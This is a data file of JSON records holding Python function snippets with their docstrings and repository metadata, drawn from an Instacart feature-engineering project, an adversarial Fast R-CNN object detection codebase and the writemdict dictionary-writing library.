{"docstring": "\"\"\"\nT = 0\nfolder = 'trainT-0'\n\"\"\"\n", "func_signal": "def make(T):\n", "code": "if T==-1:\n    folder = 'test'\nelse:\n    folder = 'trainT-'+str(T)\n    \nlog_ = log[log.order_number_rev>T]\n\n# dow\ndow = log_.drop_duplicates('order_id').groupby('order_dow').size()\ndow.name = 'dow_order_cnt'\ndow = dow.to_frame()\n\ndow['dow_item_cnt'] = log_.groupby('order_dow').size()\n\ndow /= dow.sum()\n\ndow['dow_rank_diff'] = dow.dow_order_cnt.rank() - dow.dow_item_cnt.rank()\n\ndow.reset_index().to_pickle('../feature/{}/f401_dow.p'.format(folder))\n\n\n# hour\nhour = log_.drop_duplicates('order_id').groupby('order_hour_of_day').size()\nhour.name = 'hour_order_cnt'\nhour = hour.to_frame()\n\nhour['hour_item_cnt'] = log_.groupby('order_hour_of_day').size()\n\nhour /= hour.sum()\n\nhour['hour_rank_diff'] = hour.hour_order_cnt.rank() - hour.hour_item_cnt.rank()\n\nhour.reset_index().to_pickle('../feature/{}/f401_hour.p'.format(folder))", "path": "py_feature\\401_how_many_come.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nT = 0\nfolder = 'trainT-0'\n\"\"\"\n", "func_signal": "def make(T):\n", "code": "if T==-1:\n    folder = 'test'\nelse:\n    folder = 'trainT-'+str(T)\n\nX_base = pd.read_pickle('../feature/X_base_t3.p')\nlabel = pd.read_pickle('../feature/{}/label_reordered.p'.format(folder))\n\n# 'inner' for removing t-n_order_id == NaN\nif 'train' in folder:\n    df = pd.merge(X_base[X_base.is_train==1], label, on='order_id', how='inner')\nelif folder == 'test':\n    df = pd.merge(X_base[X_base.is_train==0], label, on='order_id', how='inner')\n\ndf = pd.merge(df, \n              order_pids.add_prefix('t-1_'), \n              on='t-1_order_id', how='left')\ndf = pd.merge(df, \n              order_pids.add_prefix('t-2_'), \n              on='t-2_order_id', how='left')\n\nratio_min  = []\nratio_mean = []\nratio_max  = []\nratio_sum  = []\nratio_len  = []\nfor t_2,t_1,pid in tqdm(df[['t-2_product_id', 't-1_product_id', 'product_id']].values, miniters=99999):\n    rep = t_1 - t_2\n    if pid not in t_1 and pid in t_2 and len(rep)>0:\n        ratios = [item_di['{} {}'.format(i1,i2)] for i1,i2 in  list(product([pid], rep))]\n        ratio_min.append(np.min(ratios))\n        ratio_mean.append(np.mean(ratios))\n        ratio_max.append(np.max(ratios))\n        ratio_sum.append(np.sum(ratios))\n        ratio_len.append(len(ratios))\n    else:\n        ratio_min.append(-1)\n        ratio_mean.append(-1)\n        ratio_max.append(-1)\n        ratio_sum.append(-1)\n        ratio_len.append(-1)\n\ndf['comeback_ratio_min']  = ratio_min\ndf['comeback_ratio_mean'] = ratio_mean\ndf['comeback_ratio_max']  = ratio_max\ndf['comeback_ratio_sum']  = ratio_sum\ndf['comeback_ratio_len']  = ratio_len\n\ncol = ['order_id', 'product_id', 'comeback_ratio_min', 'comeback_ratio_mean',\n       'comeback_ratio_max', 'comeback_ratio_sum', 'comeback_ratio_len']\ndf[col].to_pickle('../feature/{}/f316_order_product.p'.format(folder))\ndel df\ngc.collect()", "path": "py_feature\\316_replacement.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nT = 0\nfolder = 'trainT-0'\n\"\"\"\n", "func_signal": "def make(T):\n", "code": "if T==-1:\n    folder = 'test'\nelse:\n    folder = 'trainT-'+str(T)\n    \nlabel = pd.read_pickle('../feature/{}/label_reordered.p'.format(folder))\nlabel = pd.merge(label, X_base, on='order_id', how='left')\n\nlog_ = log[log.order_number_rev>T]\nlog_.drop_duplicates(['user_id', 'product_id'], keep='last', inplace=True)\nlog_.drop(['order_id','order_number_rev'], axis=1, inplace=1)\nlog_.columns = ['user_id', 'product_id', 'last_order_number']\n\ndf = pd.merge(label, log_, on=['user_id', 'product_id'], how='left')\ndf['order_number_diff'] = df.order_number - df.last_order_number\n\ncol = ['order_id', 'product_id', 'last_order_number', 'order_number_diff']\ndf[col].to_pickle('../feature/{}/f305_order-product.p'.format(folder))", "path": "py_feature\\305_last_order_num.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nT = 0\nfolder = 'trainT-0'\n\"\"\"\n", "func_signal": "def make(T):\n", "code": "if T==-1:\n    folder = 'test'\nelse:\n    folder = 'trainT-'+str(T)\n    \nlog_ = pd.merge(log[log.order_number_rev>T], streak,\n                on=['order_id', 'product_id'], how='left')\n\ngr = log_.groupby('product_id')\nitem = gr.streak.mean().to_frame()\nitem.columns = ['item_streak_mean']\n\nitem['item_streak_min'] = gr.streak.min()\nitem['item_streak_max'] = gr.streak.max()\nitem['item_streak_std'] = gr.streak.std()\n\nitem.reset_index().to_pickle('../feature/{}/f210_product.p'.format(folder))", "path": "py_feature\\210_streak.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"Compute bounding-box regression targets for an image.\"\"\"\n# Indices of ground-truth ROIs\n", "func_signal": "def _compute_targets(rois, overlaps, labels):\n", "code": "gt_inds = np.where(overlaps == 1)[0]\nif len(gt_inds) == 0:\n    # Bail if the image has no ground-truth ROIs\n    return np.zeros((rois.shape[0], 5), dtype=np.float32)\n# Indices of examples for which we try to make predictions\nex_inds = np.where(overlaps >= cfg.TRAIN.BBOX_THRESH)[0]\n\n# Get IoU overlap between each ex ROI and gt ROI\nex_gt_overlaps = bbox_overlaps(\n    np.ascontiguousarray(rois[ex_inds, :], dtype=np.float),\n    np.ascontiguousarray(rois[gt_inds, :], dtype=np.float))\n\n# Find which gt ROI each ex ROI has max overlap with:\n# this will be the ex ROI's gt target\ngt_assignment = ex_gt_overlaps.argmax(axis=1)\ngt_rois = rois[gt_inds[gt_assignment], :]\nex_rois = rois[ex_inds, :]\n\ntargets = np.zeros((rois.shape[0], 5), dtype=np.float32)\ntargets[ex_inds, 0] = labels[ex_inds]\ntargets[ex_inds, 1:] = bbox_transform(ex_rois, gt_rois)\nreturn targets", "path": "lib\\roi_data_layer\\roidb.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\"Detect object classes in an image given object proposals.\n\nArguments:\n    net (caffe.Net): Fast R-CNN network to use\n    im (ndarray): color image to test (in BGR order)\n    boxes (ndarray): R x 4 array of object proposals or None (for RPN)\n\nReturns:\n    scores (ndarray): R x K array of object class scores (K includes\n        background as object category 0)\n    boxes (ndarray): R x (4*K) array of predicted bounding boxes\n\"\"\"\n", "func_signal": "def im_detect(net, im, boxes=None):\n", "code": "blobs, im_scales = _get_blobs(im, boxes)\n\n# When mapping from image ROIs to feature map ROIs, there's some aliasing\n# (some distinct image ROIs get mapped to the same feature ROI).\n# Here, we identify duplicate feature ROIs, so we only compute features\n# on the unique subset.\nif cfg.DEDUP_BOXES > 0 and not cfg.TEST.HAS_RPN:\n    v = np.array([1, 1e3, 1e6, 1e9, 1e12])\n    hashes = np.round(blobs['rois'] * cfg.DEDUP_BOXES).dot(v)\n    _, index, inv_index = np.unique(hashes, return_index=True,\n                                    return_inverse=True)\n    blobs['rois'] = blobs['rois'][index, :]\n    boxes = boxes[index, :]\n\nif cfg.TEST.HAS_RPN:\n    im_blob = blobs['data']\n    blobs['im_info'] = np.array(\n        [[im_blob.shape[2], im_blob.shape[3], im_scales[0]]],\n        dtype=np.float32)\n\n# reshape network inputs\nnet.blobs['data'].reshape(*(blobs['data'].shape))\nif cfg.TEST.HAS_RPN:\n    net.blobs['im_info'].reshape(*(blobs['im_info'].shape))\nelse:\n    net.blobs['rois'].reshape(*(blobs['rois'].shape))\n\n# do forward\nforward_kwargs = {'data': blobs['data'].astype(np.float32, copy=False)}\nif cfg.TEST.HAS_RPN:\n    forward_kwargs['im_info'] = blobs['im_info'].astype(np.float32, copy=False)\nelse:\n    forward_kwargs['rois'] = blobs['rois'].astype(np.float32, copy=False)\nblobs_out = net.forward(**forward_kwargs)\n\nif cfg.TEST.HAS_RPN:\n    assert len(im_scales) == 1, \"Only single-image batch implemented\"\n    rois = net.blobs['rois'].data.copy()\n    # unscale back to raw image space\n    boxes = rois[:, 1:5] / im_scales[0]\n\nif cfg.TEST.SVM:\n    # use the raw scores before softmax under the assumption they\n    # were trained as linear SVMs\n    scores = net.blobs['cls_score'].data\nelse:\n    # use softmax estimated probabilities\n    scores = blobs_out['cls_prob']\n\nif cfg.TEST.BBOX_REG:\n    # Apply bounding-box regression deltas\n    box_deltas = blobs_out['bbox_pred']\n    pred_boxes = bbox_transform_inv(boxes, box_deltas)\n    pred_boxes = clip_boxes(pred_boxes, im.shape)\nelse:\n    # Simply repeat the boxes, once for each class\n    pred_boxes = np.tile(boxes, (1, scores.shape[1]))\n\nif cfg.DEDUP_BOXES > 0 and not cfg.TEST.HAS_RPN:\n    # Map scores and predictions back to the original set of boxes\n    scores = scores[inv_index, :]\n    pred_boxes = pred_boxes[inv_index, :]\n\nreturn scores, pred_boxes", "path": "lib\\fast_rcnn\\test.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\"\nGet ann ids that satisfy given filter conditions. default skips that filter\n:param imgIds  (int array)     : get anns for given imgs\n       catIds  (int array)     : get anns for given cats\n       areaRng (float array)   : get anns for given area range (e.g. [0 inf])\n       iscrowd (boolean)       : get anns for given crowd label (False or True)\n:return: ids (int array)       : integer array of ann ids\n\"\"\"\n", "func_signal": "def getAnnIds(self, imgIds=[], catIds=[], areaRng=[], iscrowd=None):\n", "code": "imgIds = imgIds if type(imgIds) == list else [imgIds]\ncatIds = catIds if type(catIds) == list else [catIds]\n\nif len(imgIds) == len(catIds) == len(areaRng) == 0:\n    anns = self.dataset['annotations']\nelse:\n    if not len(imgIds) == 0:\n        # this can be changed by defaultdict\n        lists = [self.imgToAnns[imgId] for imgId in imgIds if imgId in self.imgToAnns]\n        anns = list(itertools.chain.from_iterable(lists))\n    else:\n        anns = self.dataset['annotations']\n    anns = anns if len(catIds)  == 0 else [ann for ann in anns if ann['category_id'] in catIds]\n    anns = anns if len(areaRng) == 0 else [ann for ann in anns if ann['area'] > areaRng[0] and ann['area'] < areaRng[1]]\nif not iscrowd == None:\n    ids = [ann['id'] for ann in anns if ann['iscrowd'] == iscrowd]\nelse:\n    ids = [ann['id'] for ann in anns]\nreturn ids", "path": "lib\\pycocotools\\coco.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\"Converts RoIs into network inputs.\n\nArguments:\n    im_rois (ndarray): R x 4 matrix of RoIs in original image coordinates\n    im_scale_factors (list): scale factors as returned by _get_image_blob\n\nReturns:\n    blob (ndarray): R x 5 matrix of RoIs in the image pyramid\n\"\"\"\n", "func_signal": "def _get_rois_blob(im_rois, im_scale_factors):\n", "code": "rois, levels = _project_im_rois(im_rois, im_scale_factors)\nrois_blob = np.hstack((levels, rois))\nreturn rois_blob.astype(np.float32, copy=False)", "path": "lib\\fast_rcnn\\test.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "# (1, 3, 1, 1) shaped arrays\n", "func_signal": "def setup(self, bottom, top):\n", "code": "self.PIXEL_MEANS = \\\n    np.array([[[[0.48462227599918]],\n               [[0.45624044862054]],\n               [[0.40588363755159]]]])\nself.PIXEL_STDS = \\\n    np.array([[[[0.22889466674951]],\n               [[0.22446679341259]],\n               [[0.22495548344775]]]])\n# The default (\"old\") pixel means that were already subtracted\nchannel_swap = (0, 3, 1, 2)\nself.OLD_PIXEL_MEANS = \\\n    cfg.PIXEL_MEANS[np.newaxis, :, :, :].transpose(channel_swap)\n\ntop[0].reshape(*(bottom[0].shape))", "path": "lib\\transform\\torch_image_transform_layer.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\"Enrich the imdb's roidb by adding some derived quantities that\nare useful for training. This function precomputes the maximum\noverlap, taken over ground-truth boxes, between each ROI and\neach ground-truth box. The class with maximum overlap is also\nrecorded.\n\"\"\"\n", "func_signal": "def prepare_roidb(imdb):\n", "code": "sizes = [PIL.Image.open(imdb.image_path_at(i)).size\n         for i in xrange(imdb.num_images)]\nroidb = imdb.roidb\nfor i in xrange(len(imdb.image_index)):\n    roidb[i]['image'] = imdb.image_path_at(i)\n    roidb[i]['width'] = sizes[i][0]\n    roidb[i]['height'] = sizes[i][1]\n    # need gt_overlaps as a dense array for argmax\n    gt_overlaps = roidb[i]['gt_overlaps'].toarray()\n    # max overlap with gt over classes (columns)\n    max_overlaps = gt_overlaps.max(axis=1)\n    # gt class that had the max overlap\n    max_classes = gt_overlaps.argmax(axis=1)\n    roidb[i]['max_classes'] = max_classes\n    roidb[i]['max_overlaps'] = max_overlaps\n    # sanity checks\n    # max overlap of 0 => class should be zero (background)\n    zero_inds = np.where(max_overlaps == 0)[0]\n    assert all(max_classes[zero_inds] == 0)\n    # max overlap > 0 => class should not be zero (must be a fg class)\n    nonzero_inds = np.where(max_overlaps > 0)[0]\n    assert all(max_classes[nonzero_inds] != 0)", "path": "lib\\roi_data_layer\\roidb.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\"\nLoad anns with the specified ids.\n:param ids (int array)       : integer ids specifying anns\n:return: anns (object array) : loaded ann objects\n\"\"\"\n", "func_signal": "def loadAnns(self, ids=[]):\n", "code": "if type(ids) == list:\n    return [self.anns[id] for id in ids]\nelif type(ids) == int:\n    return [self.anns[ids]]", "path": "lib\\pycocotools\\coco.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\"Compute bounding-box regression targets for an image.\"\"\"\n\n", "func_signal": "def _compute_targets(ex_rois, gt_rois):\n", "code": "assert ex_rois.shape[0] == gt_rois.shape[0]\nassert ex_rois.shape[1] == 4\nassert gt_rois.shape[1] == 5\n\nreturn bbox_transform(ex_rois, gt_rois[:, :4]).astype(np.float32, copy=False)", "path": "lib\\rpn\\anchor_target_layer.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\"\nLoad cats with the specified ids.\n:param ids (int array)       : integer ids specifying cats\n:return: cats (object array) : loaded cat objects\n\"\"\"\n", "func_signal": "def loadCats(self, ids=[]):\n", "code": "if type(ids) == list:\n    return [self.cats[id] for id in ids]\nelif type(ids) == int:\n    return [self.cats[ids]]", "path": "lib\\pycocotools\\coco.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\" Unmap a subset of item (data) back to the original set of items (of\nsize count) \"\"\"\n", "func_signal": "def _unmap(data, count, inds, fill=0):\n", "code": "if len(data.shape) == 1:\n    ret = np.empty((count, ), dtype=np.float32)\n    ret.fill(fill)\n    ret[inds] = data\nelse:\n    ret = np.empty((count, ) + data.shape[1:], dtype=np.float32)\n    ret.fill(fill)\n    ret[inds, :] = data\nreturn ret", "path": "lib\\rpn\\anchor_target_layer.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\"Apply non-maximum suppression to all predicted boxes output by the\ntest_net method.\n\"\"\"\n", "func_signal": "def apply_nms(all_boxes, thresh):\n", "code": "num_classes = len(all_boxes)\nnum_images = len(all_boxes[0])\nnms_boxes = [[[] for _ in xrange(num_images)]\n             for _ in xrange(num_classes)]\nfor cls_ind in xrange(num_classes):\n    for im_ind in xrange(num_images):\n        dets = all_boxes[cls_ind][im_ind]\n        if dets == []:\n            continue\n        # CPU NMS is much faster than GPU NMS when the number of boxes\n        # is relative small (e.g., < 10k)\n        # TODO(rbg): autotune NMS dispatch\n        keep = nms(dets, thresh, force_cpu=True)\n        if len(keep) == 0:\n            continue\n        nms_boxes[cls_ind][im_ind] = dets[keep, :].copy()\nreturn nms_boxes", "path": "lib\\fast_rcnn\\test.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\"\nParse input arguments\n\"\"\"\n", "func_signal": "def parse_args():\n", "code": "parser = argparse.ArgumentParser(description='Train SVMs (old skool)')\nparser.add_argument('--gpu', dest='gpu_id', help='GPU device id to use [0]',\n                    default=0, type=int)\nparser.add_argument('--def', dest='prototxt',\n                    help='prototxt file defining the network',\n                    default=None, type=str)\nparser.add_argument('--net', dest='caffemodel',\n                    help='model to test',\n                    default=None, type=str)\nparser.add_argument('--cfg', dest='cfg_file',\n                    help='optional config file', default=None, type=str)\nparser.add_argument('--imdb', dest='imdb_name',\n                    help='dataset to train on',\n                    default='voc_2007_trainval', type=str)\n\nif len(sys.argv) == 1:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\nreturn args", "path": "tools\\train_svms.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\"Remove all boxes with any side smaller than min_size.\"\"\"\n", "func_signal": "def _filter_boxes(boxes, min_size):\n", "code": "ws = boxes[:, 2] - boxes[:, 0] + 1\nhs = boxes[:, 3] - boxes[:, 1] + 1\nkeep = np.where((ws >= min_size) & (hs >= min_size))[0]\nreturn keep", "path": "lib\\rpn\\proposal_layer.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\"Project image RoIs into the image pyramid built by _get_image_blob.\n\nArguments:\n    im_rois (ndarray): R x 4 matrix of RoIs in original image coordinates\n    scales (list): scale factors as returned by _get_image_blob\n\nReturns:\n    rois (ndarray): R x 4 matrix of projected RoI coordinates\n    levels (list): image pyramid levels used by each projected RoI\n\"\"\"\n", "func_signal": "def _project_im_rois(im_rois, scales):\n", "code": "im_rois = im_rois.astype(np.float, copy=False)\n\nif len(scales) > 1:\n    widths = im_rois[:, 2] - im_rois[:, 0] + 1\n    heights = im_rois[:, 3] - im_rois[:, 1] + 1\n\n    areas = widths * heights\n    scaled_areas = areas[:, np.newaxis] * (scales[np.newaxis, :] ** 2)\n    diff_areas = np.abs(scaled_areas - 224 * 224)\n    levels = diff_areas.argmin(axis=1)[:, np.newaxis]\nelse:\n    levels = np.zeros((im_rois.shape[0], 1), dtype=np.int)\n\nrois = im_rois * scales[levels]\n\nreturn rois, levels", "path": "lib\\fast_rcnn\\test.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\"\nfiltering parameters. default skips that filter.\n:param catNms (str array)  : get cats for given cat names\n:param supNms (str array)  : get cats for given supercategory names\n:param catIds (int array)  : get cats for given cat ids\n:return: ids (int array)   : integer array of cat ids\n\"\"\"\n", "func_signal": "def getCatIds(self, catNms=[], supNms=[], catIds=[]):\n", "code": "catNms = catNms if type(catNms) == list else [catNms]\nsupNms = supNms if type(supNms) == list else [supNms]\ncatIds = catIds if type(catIds) == list else [catIds]\n\nif len(catNms) == len(supNms) == len(catIds) == 0:\n    cats = self.dataset['categories']\nelse:\n    cats = self.dataset['categories']\n    cats = cats if len(catNms) == 0 else [cat for cat in cats if cat['name']          in catNms]\n    cats = cats if len(supNms) == 0 else [cat for cat in cats if cat['supercategory'] in supNms]\n    cats = cats if len(catIds) == 0 else [cat for cat in cats if cat['id']            in catIds]\nids = [cat['id'] for cat in cats]\nreturn ids", "path": "lib\\pycocotools\\coco.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\"Convert an image and RoIs within that image into network inputs.\"\"\"\n", "func_signal": "def _get_blobs(im, rois):\n", "code": "blobs = {'data' : None, 'rois' : None}\nblobs['data'], im_scale_factors = _get_image_blob(im)\nif not cfg.TEST.HAS_RPN:\n    blobs['rois'] = _get_rois_blob(rois, im_scale_factors)\nreturn blobs, im_scale_factors", "path": "lib\\fast_rcnn\\test.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\"\nParse input arguments\n\"\"\"\n", "func_signal": "def parse_args():\n", "code": "parser = argparse.ArgumentParser(description='Network surgery script')\nparser.add_argument('--out_net_def', help='prototxt file defining the output network', default=None, type=str)\nparser.add_argument('--net_surgery_json', help='json file which defines what blobs to copy from where', default=None, type=str)\nparser.add_argument('--out_net_file', help='caffemodel to save the ouput network to', default=None, type=str)\nif len(sys.argv) == 1:\n  parser.print_help()\n  sys.exit(1)\nargs = parser.parse_args()\nreturn args", "path": "python_utils\\do_net_surgery.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\"\nParse input arguments\n\"\"\"\n", "func_signal": "def parse_args():\n", "code": "parser = argparse.ArgumentParser(description='Re-evaluate results')\nparser.add_argument('output_dir', nargs=1, help='results directory',\n                    type=str)\nparser.add_argument('--imdb', dest='imdb_name',\n                    help='dataset to re-evaluate',\n                    default='voc_2007_test', type=str)\nparser.add_argument('--matlab', dest='matlab_eval',\n                    help='use matlab for evaluation',\n                    action='store_true')\nparser.add_argument('--comp', dest='comp_mode', help='competition mode',\n                    action='store_true')\nparser.add_argument('--nms', dest='apply_nms', help='apply nms',\n                    action='store_true')\n\nif len(sys.argv) == 1:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\nreturn args", "path": "tools\\reval.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "# Start all SVM parameters at zero\n", "func_signal": "def initialize_net(self):\n", "code": "self.net.params['cls_score'][0].data[...] = 0\nself.net.params['cls_score'][1].data[...] = 0\n\n# Initialize SVMs in a smart way. Not doing this because its such\n# a good initialization that we might not learn something close to\n# the SVM solution.", "path": "tools\\train_svms.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "# Initialize SVMs using\n#   a. w_i = fc8_w_i - fc8_w_0\n#   b. b_i = fc8_b_i - fc8_b_0\n#   c. Install SVMs into net\n", "func_signal": "def train(self):\n", "code": "self.initialize_net()\n\n# Pass over roidb to count num positives for each class\n#   a. Pre-allocate arrays for positive feature vectors\n# Pass over roidb, computing features for positives only\nself.get_pos_examples()\n\n# Pass over roidb\n#   a. Compute cls_score with forward pass\n#   b. For each class\n#       i. Select hard negatives\n#       ii. Add them to cache\n#   c. For each class\n#       i. If SVM retrain criteria met, update SVM\n#       ii. Install new SVM into net\nself.train_with_hard_negatives()\n\n# One final SVM retraining for each class\n# Install SVMs into net\nfor j in xrange(1, self.imdb.num_classes):\n    new_w_b = self.trainers[j].append_neg_and_retrain(force=True)\n    self.update_net(j, new_w_b[0], new_w_b[1])", "path": "tools\\train_svms.py", "repo_name": "xiaolonw/adversarial-frcnn", "stars": 477, "license": "other", "language": "python", "size": 606}
{"docstring": "\"\"\" Return the bottom 32 bits of w as a Python int.\n    This creates longs temporarily, but returns an int. \"\"\"\n", "func_signal": "def trunc32( w ):\n", "code": "w = int( ( w & 0x7fffFFFF ) | -( w & 0x80000000 ) )\nassert type(w) == int\nreturn w", "path": "pureSalsa20.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "# Returns a bytes object, containing the entry for this block in the record\n# block index.\n\n", "func_signal": "def get_index_entry(self):\n", "code": "if self._version == \"2.0\":\n\tformat = b\">QQ\"\nelse:\n\tformat = b\">LL\"\nreturn struct.pack(format, self._comp_size, self._decomp_size)", "path": "writemdict.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "# Sets self._offset_table to a table of entries _OffsetTableEntry objects e.\n#\n# where:\n#  e.key: encoded version of the key, not null-terminated\n#  e.key_null: encoded version of the key, null-terminated\n#  e.key_len: the length of the key, in either bytes or 2-byte units, not counting the null character\n#        (as required by the MDX format in the keyword index)\n#  e.offset: the cumulative sum of len(record_null) for preceding records\n#  e.record_null: encoded version of the record, null-terminated\n#\n# Also sets self._total_record_len to the total length of all record fields.\n", "func_signal": "def _build_offset_table(self,d):\n", "code": "items = list(d.items())\nitems.sort(key=operator.itemgetter(0))\n\nself._offset_table = []\noffset = 0\nfor key, record in items:\n\tkey_enc = key.encode(self._python_encoding)\n\tkey_null = (key+\"\\0\").encode(self._python_encoding)\n\tkey_len = len(key_enc) // self._encoding_length\n\t\n\t# set record_null to a the the value of the record. If it's\n\t# an MDX file, append an extra null character.\n\tif self._is_mdd:\n\t\trecord_null = record\n\telse:\n\t\trecord_null = (record+\"\\0\").encode(self._python_encoding) \n\tself._offset_table.append(_OffsetTableEntry(\n\t    key=key_enc,\n\t    key_null=key_null,\n\t    key_len=key_len,\n\t    record_null=record_null,\n\t    offset=offset))\n\toffset += len(record_null)\nself._total_record_len = offset", "path": "writemdict.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "\"\"\"\nGenerates a hexadecimal key for use with the official MDict program.\n\nParameters:\n  dict_key: a bytes object, representing the dictionary password.\n\nKeyword parameters:\n  Exactly one of email and device_id should be specified. They should be unicode strings,\n  representing either the user's email address, or the device ID of the machine on which\n  the dictionary is to be opened.\n\nReturn value:\n  a string of 32 hexadecimal digits. This should be placed in a file of its own,\n  with the same name and location as the mdx file but the extension changed to '.key'.\n\nExample usage:\n\tkey = encrypt_key(b\"password\", email=\"username@example.com\")\n\n\tkey = encrypt_key(b\"password\", device_id=\"12345678-9012-3456-7890-1234\")\n\"\"\"\n\n", "func_signal": "def encrypt_key(dict_key, **kwargs):\n", "code": "if((\"email\" not in kwargs and \"device_id\" not in kwargs) or (\"email\" in kwargs and \"device_id\" in kwargs)):\n\traise ParameterError(\"Expected exactly one of email and device_id as keyword argument\")\n\n\nif \"email\" in kwargs:\n\towner_info_digest = ripemd128(kwargs[\"email\"].encode(\"ascii\"))\nelse:\n\towner_info_digest = ripemd128(kwargs[\"device_id\"].encode(\"ascii\"))\n\ndict_key_digest = ripemd128(dict_key)\n\ns20 = Salsa20(key=owner_info_digest,IV=b\"\\x00\"*8,rounds=8)\noutput_key = s20.encryptBytes(dict_key_digest)\nreturn _hexdump(output_key)", "path": "writemdict.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "# Sets self._recordb_index to a bytes object, containing the index of key blocks,\n# in a format suitable for direct writing to the file.\n\n# Also sets self._recordb_index_size.\n\n", "func_signal": "def _build_recordb_index(self):\n", "code": "self._recordb_index = b\"\".join(\n    (b.get_index_entry() for b in self._record_blocks))\nself._recordb_index_size = len(self._recordb_index)", "path": "writemdict.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "# Builds the data from offset_table.\n#\n# offset_table is a iterable containing _OffsetTableEntry objects.\n\n", "func_signal": "def __init__(self, offset_table, compression_type, version):\n", "code": "decomp_data = b\"\".join(\n    type(self)._block_entry(t, version)\n    for t in offset_table)\nself._decomp_size = len(decomp_data)\nself._comp_data = _mdx_compress(decomp_data, compression_type)\nself._comp_size = len(self._comp_data)\nself._version = version", "path": "writemdict.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "\"\"\" \\\nDefine and return a testing version of pureSalsa20's Salsa20 class.\n\"\"\"\n\n", "func_signal": "def patch_pureSalsa20():\n", "code": "class Testing_puresalsa20( pureSalsa20.Salsa20 ):\n\n    def salsa20core( self, input, nRounds ):\n        assert type( input ) == bytes, 'input must be byte string'\n        assert len( input ) == 64, 'input must be 64-byte string'\n\n        # Interpret each four input bytes as a little-endian word,\n        # placing into a Python list of ints.\n        ctx = little16_i32.unpack( input )\n        w2b = pureSalsa20.salsa20_wordtobyte\n        return w2b( ctx, nRounds, checkRounds=False )\n\n\n    def force_nRounds( self, nRounds ):\n        \"\"\" \\\n        Set # of rounds bypassing the \"in [8,12,20]\" check, for testing.\n        \"\"\"\n        self.setRounds( nRounds, testing=True )\n\n# Return the class:\nreturn Testing_puresalsa20", "path": "testSalsa20.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "# Sets self._keyb_index to a bytes object, containing the index of key blocks, in\n# a format suitable for direct writing to the file.\n#\n# Also sets self._keyb_index_comp_size and self._keyb_index_decomp_size.\n\n", "func_signal": "def _build_keyb_index(self):\n", "code": "decomp_data = b\"\".join(b.get_index_entry() for b in self._key_blocks)\nself._keyb_index_decomp_size = len(decomp_data)\nif self._version == \"2.0\":\n\tself._keyb_index = _mdx_compress(decomp_data, self._compression_type)\n\tif self._encrypt_index:\n\t\tself._keyb_index = _mdx_encrypt(self._keyb_index)\n\tself._keyb_index_comp_size = len(self._keyb_index)\nelif self._encrypt_index:\n\traise ParameterError(\"Key index encryption not supported in version 1.2\")\nelse:\n\tself._keyb_index = decomp_data", "path": "writemdict.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
